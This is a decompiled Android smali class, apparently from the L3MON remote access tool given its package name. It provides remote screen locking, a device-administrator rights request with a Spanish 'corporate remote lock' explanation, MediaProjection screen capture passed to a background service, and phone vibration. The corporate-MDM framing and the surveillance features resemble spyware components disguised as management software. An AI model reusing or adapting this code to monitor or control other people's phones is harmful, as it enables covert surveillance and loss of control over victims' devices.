.class public Lcom/etechd/l3mon/MDMActionHandler;
.super Ljava/lang/Object;
.source "MDMActionHandler.java"


# static fields
.field private static final REQUEST_SCREENSHOT:I = 0x3e9


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 25
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static lockScreen(Landroid/content/Context;)V
    .locals 3

    .line 86
    :try_start_0
    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    .line 87
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/etechd/l3mon/MDMDeviceAdminReceiver;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 89
    if-eqz v0, :cond_0

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 90
    invoke-virtual {v0}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    goto :goto_0

    .line 93
    :cond_0
    new-instance v0, Landroid/content/Intent;

    const-string v2, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v0, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 94
    const-string v2, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 95
    const-string v1, "android.app.extra.ADD_EXPLANATION"

    const-string v2, "Para el bloqueo remoto corporativo, esta aplicaci\u00c3\u00b3n necesita privilegios de administrador de dispositivo."

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 99
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 100
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 104
    :goto_0
    goto :goto_1

    .line 102
    :catch_0
    move-exception p0

    .line 103
    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    .line 105
    :goto_1
    return-void
.end method

.method public static requestScreenCapture(Landroid/app/Activity;)V
    .locals 2

    .line 127
    nop

    .line 128
    const-string v0, "media_projection"

    invoke-virtual {p0, v0}, Landroid/app/Activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    .line 129
    if-eqz v0, :cond_0

    .line 130
    nop

    .line 131
    invoke-virtual {v0}, Landroid/media/projection/MediaProjectionManager;->createScreenCaptureIntent()Landroid/content/Intent;

    move-result-object v0

    .line 130
    const/16 v1, 0x3e9

    invoke-virtual {p0, v0, v1}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    .line 135
    :cond_0
    return-void
.end method

.method public static startScreenCaptureService(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3

    .line 138
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/etechd/l3mon/ScreenCaptureService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 139
    const-string v1, "RESULT_CODE"

    const/4 v2, -0x1

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    .line 140
    const-string v1, "RESULT_DATA"

    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 141
    nop

    .line 142
    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 146
    return-void
.end method

.method public static vibrate(Landroid/content/Context;J)V
    .locals 3

    .line 42
    :try_start_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1f

    const/4 v2, -0x1

    if-lt v0, v1, :cond_1

    .line 44
    const-string v0, "vibrator_manager"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/os/VibratorManager;

    .line 45
    if-eqz p0, :cond_0

    .line 46
    invoke-virtual {p0}, Landroid/os/VibratorManager;->getDefaultVibrator()Landroid/os/Vibrator;

    move-result-object p0

    .line 47
    invoke-static {p1, p2, v2}, Landroid/os/VibrationEffect;->createOneShot(JI)Landroid/os/VibrationEffect;

    move-result-object p1

    .line 46
    invoke-virtual {p0, p1}, Landroid/os/Vibrator;->vibrate(Landroid/os/VibrationEffect;)V

    .line 50
    :cond_0
    goto :goto_0

    :cond_1
    nop

    .line 52
    const-string v0, "vibrator"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/os/Vibrator;

    .line 53
    if-eqz p0, :cond_2

    .line 54
    invoke-static {p1, p2, v2}, Landroid/os/VibrationEffect;->createOneShot(JI)Landroid/os/VibrationEffect;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/os/Vibrator;->vibrate(Landroid/os/VibrationEffect;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 56
    :cond_2
    nop

    .line 65
    :goto_0
    goto :goto_1

    .line 63
    :catch_0
    move-exception p0

    .line 64
    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    .line 66
    :goto_1
    return-void
.end method
